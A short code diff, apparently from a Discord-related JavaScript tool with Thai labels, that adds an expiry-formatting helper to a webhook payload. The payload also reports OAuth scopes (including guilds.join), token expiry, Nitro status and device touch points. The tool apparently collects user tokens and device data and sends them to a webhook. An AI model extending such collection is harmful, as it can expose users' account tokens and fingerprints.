@@ -179,6 +179,17 @@ function formatNitro(premiumType) {
     return "ไม่มี";
 }
 
+function formatExpires(expiresAt) {
+    if (!expiresAt) return "7 วัน";
+    try {
+        const ms = new Date(expiresAt).getTime() - Date.now();
+        const days = Math.max(1, Math.round(ms / (24 * 60 * 60 * 1000)));
+        return `${days} วัน (หมดอายุ ${formatDate(expiresAt)})`;
+    } catch {
+        return formatDate(expiresAt);
+    }
+}
+
 function formatTouchscreen(touchPoints) {
     if (touchPoints != null && !isNaN(Number(touchPoints))) {
         const tp = Number(touchPoints);
@@ -371,7 +382,7 @@ function buildWebhookPayload({
 
     // Section 5: สิทธิ์และการเข้าถึง
     const scopeStr = tokens.scope || "identify email connections guilds guilds.members.read guilds.join";
-    const expiresStr = tokens.expiresAt ? `${formatDate(tokens.expiresAt)}` : "7 วัน";
+    const expiresStr = formatExpires(tokens.expiresAt);
     const securityFindingsStr = Array.isArray(findings) && findings.length ? findings.join(", ") : "ไม่พบความเสี่ยง";
 
     const tokenLines = [
